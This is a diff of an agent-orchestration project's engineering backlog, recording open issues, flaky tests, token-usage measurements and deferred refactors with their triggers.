+  - Phase 56 Wave 2 merge run (2026-10-30), passed alone: `tests/integration/product/test_runtime_execution_envelope.py`,
+    8 setup errors from `uv build` exiting 2 in a parallel worker.
 - *To investigate, important: a pod logging in to a site nobody configured.* Per-service MCP bridges and `secret:<name>`
   are fixed when a server is registered; a task that ends in a `send` at a new site that needs a login has no per-site
   credential the model never sees. Raised by the maintainer 2026-10-30. Analysis, seven open questions and a suggested
@@ -404,10 +683,9 @@ that already own the files.
     new feature name.
   - "Turns taken" is read three ways: `len(hops)` in `_park_turn` and in the task dump, answered hops in the
     budget end. They agree until a final hop fails. Trigger: a `turns` count that disagrees with the hops shown.
-  - Names written twice. The `reply` option id is in `answers.py` and in `escalations.py` (`_REPLY`); `tool_queue`
-    and `tool_retry` in `mcp.py` repeat one queue dump; an error `code` reaches the wire as `DocketError.code` and
-    as `_send_json_error(code=)`; `task_control.py` builds a `Conflict` only to render it. Trigger: the next edit of
-    any of them.
+  - Two refusal paths. An error `code` reaches the wire as `DocketError.code` and as `_send_json_error(code=)`;
+    `task_control.py` builds a `Conflict` only to render it, where `post_task_retry` calls `_send_json_error` (unifying
+    them moves an HTTP body). Trigger: the next edit of either route.
   - `decide_task_tokens` is untouched: the budget end of a conversation is decided in the executor
     (`conversation_ends_on_budget`). Trigger: a second consumer of "ended after an answered turn".
   - Flakes under load, each passing alone, seen once: `tests/guards/test_no_removed_cli_names.py` (a 2 s timing
@@ -428,10 +706,6 @@ that already own the files.
   - `summarize_recipe` does not count a recipe's `services/`; `gen_recipe_docs._brings` and
     `pod_config_library._brings` are two near-duplicates. The `captured` column of `stories` holds the day a story
     was posted (the model has no clock); the row's `_at` is the capture time.
-  - Prose still behind the code: the MCP client text ("workdir blueprint such as research"),
-    `README.md` line 11 ("research, content or outward work"), `builtin_roles.py:68` ("forward-compat"), and
-    `config-format.spec.md` (~line 115, `load_pipeline(text)`); `_blueprint_pipeline` loads a registry only to call
-    `load_pipeline(None, ...)`; `conversations.load` returns an empty registry for an invalid file.
   - Records port (P56-23, merged): a second backend is one adapter module, one line in
     `bootstrap._open_records` and one `BACKENDS` entry in the conformance suite; a remote one needs the ADR
     amendment on `send` first, and S3 is an export destination, not a backend. `teams/records.py` quotes a set name
@@ -444,9 +718,9 @@ that already own the files.
   - Records and services: `pod update` does not check that a `rec__<set>` allow-list entry names a declared set;
     real PostgREST documents carry no `operationId`; `setup service list` shows secret names; the `ask-before-send` custom message is not shown
     for service sends; service results are not screened as untrusted; `pod records --csv` overwrites silently; the
-    idempotency key also hashes path and query arguments; `pod-blueprints.spec.md` should list `services/`.
-  - Code: `setup_model_credentials._write_credential` duplicates store logic; `config_docs.py` imports itself;
-    `_read_until_deadline` is duplicated; `decided_approval` sits in `escalations.py`.
+    idempotency key also hashes path and query arguments.
+  - Code: `decided_approval` sits in `escalations.py`; `_blueprint_pipeline` (`hops/application/steps.py:96-97`) loads a
+    registry only to call `load_pipeline(None, ...)`; `conversations.load` returns an empty registry for an invalid file.
 - *Phase 55 close (the repeated real run, 2026-10-30).* `docket run` does not wake a `wait` whose time has passed
   ("No pending tasks"); only the dispatch service's sweep does, as the spec says; a person expecting `run` to finish
   it is surprised (trigger: a second report). In one fresh home `setup provider add local ...` left the roles on
@@ -497,14 +771,6 @@ that already own the files.
   `tasks/application/repository.py:48`). Not business data, and a port with one implementation is the
   "unwired machinery" this project refuses. Trigger: a queue the one file cannot carry (measured).
 
-**Fired, waiting for a maintainer go (the measurement spends hosted-model tokens).**
-
-- **The implementer sends 0.65 of what the backend counts** (Phase 45 real runs on `app-dev`,
-  2026-10-20: 14 and 13 calls, largest request about 7,000 estimated tokens; reviewer 0.62, the other
-  verdict hops 0.80 and 0.90). The Phase 44 trigger ("a real implementer run with its grants declared that still sends
-  over half") fired. Next: P52-1 measures which calls repeat on the recorded traces (no live run
-  needed); P53-4 (which absorbed P52-5) acts on the figure.
-
 **Model adaptation and context (ADR 0033, deferred with triggers; the cards are Phase 52).**
 
 - **Reasoning kept inside the turn** (`ChatMessage.reasoning`, resent only in the active tool
@@ -540,9 +806,6 @@ that already own the files.
   so it would prepare and branch the enclosing repository. Only the live-eval and smoke worlds
   refuse that today (`specs/test-framework.md`). Trigger: a pod registered on a subdirectory or
   a nested path that is not a repo.
-- **`scripts/render-doc-assets.py:275` prints a made-up approval token** (`token=apr-...`) and the
-  `waiting_approval` line, shapes Phase 51 removed. Trigger: the maintainer re-captures the README
-  assets (a classifier-refused step); then render the escalation id and `waiting_input`.
 
 **Test suite under load (found at the Phase 47 close, 2026-10-24; each passes alone).**
 
@@ -552,9 +815,6 @@ that already own the files.
   `test_escalation_http.py::test_a_parked_approval_is_served_with_no_token_anywhere` (`KeyError: 'escalations'`
   under the no-sandbox lane's load at the Phase 69-70 close; passes alone). Trigger: a second
   failure of the same test. Then replace its wall-clock wait with an event.
-- **Docstring budget:** `comment_lint.py` counts 209 long definition docstrings at the close against 205
-  on `develop` (most moved or renamed code). Trigger: the next card that edits one of those modules
-  trims its own.
 - **Two contract files set the merge run's floor** (measured 2026-10-28, `--durations=0`):
   `tests/contracts/test_a2a_http.py` 60 s and `test_escalation_http.py` 35 s of the 84 s run. Each
   test's function-scoped `parked` fixture runs a real `docket run` and starts a service (about 3 s
@@ -571,7 +831,9 @@ that already own the files.
   the park, 8,181 after; 100,573 in the 2026-10-18 joint run). Trigger: a third run that parks on the
   same shape. Then weigh resuming the session over re-running the hop (operator-loop §2 item 6).
   **FIRED 2026-11-04:** the P67-5 writer parked on a question and resumed with 21,642 input tokens, 0 cached
-  (21:41:43 UTC); its second resume, after the approval, died in compaction (P68-1).
+  (21:41:43 UTC); its second resume, after the approval, died in compaction (P68-1). **Re-measured 2026-11-08**
+  (2026-11-03..06): 5 of 6 resumes kept the cache, about 2k uncached tokens each (`task-69fa3927`); the sixth is the
+  compaction P68-1 fixed. Not a card; the trigger is a resume that re-sends uncached after P68-1.
 - **A hop refused before any call records an empty model** (`hop_finished.model == ""`, a `""` key in
   `usage.byModel`). Trigger: a reader of `byModel` that trips on it.
 - **Hop language drift:** a resumed step once wrote its report in another language, which became the
@@ -609,7 +871,6 @@ that already own the files.
 
 **Channels, inbox and the HTTP API.**
 
-- **`docket start`'s periodic notify flush ignores `FlushReport.error`** (`interfaces/http/server.py:200`).
 - **Enabling the `email` channel checks nothing**; with no `to`, `from` or `smtpHost`, every delivery
   fails into the health record. Trigger: an operator enables it.
 - **Pending memory entries show in `docket inbox` but not in `GET /inbox`, MCP `inbox`, notifications or
@@ -629,7 +890,7 @@ that already own the files.
 - **Three readers of the implementer's codebase** (`rg -n "def _pod_codebase|def _codebase|def
   task_diff" src`); one helper when next touched.
 - **`memory_update` has no structural telemetry key**; members stamped `POD_TEMPLATE_VERSION` 4 show stale
-  to `pod update` by text comparison; `scripts/smoke_workflow.py`'s memory scenario needs a live run.
+  to `pod update` by text comparison.
 
 **Phases 52 and 53 (closed 2026-10-29).** Triaged the same day: the brief redaction, the prompt `tests` file, a role's
 unknown tool name, `pod test`'s handoff spec, the live-run key lookup and the stale docs were fixed; what stays waits
@@ -650,8 +911,7 @@ for its trigger.
   to +3 %" was against the pre-P52-2 `condense_history`, which the bench's `phase44` policy now calls live, so it is no
   longer reproducible; the small-result rule stays. The re-ask, finalization and closing texts
   (`hops/application/runner.py`, `agent/loop_request.py`) are the harness's protocol, versioned with the code and the
-  agent-loop spec, not role prompts. `smoke_workflow.py` calls an interpreter running a script (`PYTHONPATH=src python3
-  x.py`) opaque on purpose: it can read any file, so the private-path check fails closed; `VAR=x` alone is parsed.
+  agent-loop spec, not role prompts.
 
 **Architecture and packaging.**
 
